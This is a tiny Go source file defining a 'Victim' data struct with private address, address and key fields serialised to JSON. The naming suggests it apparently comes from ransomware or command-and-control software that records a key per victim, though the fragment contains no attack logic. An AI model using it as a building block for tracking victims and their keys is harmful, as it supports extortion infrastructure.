package models

type Victim struct {
	Priv_address string `json:"priv_address"`
	Address      string `json:"address"`
	Key          []byte `json:"key"`
}
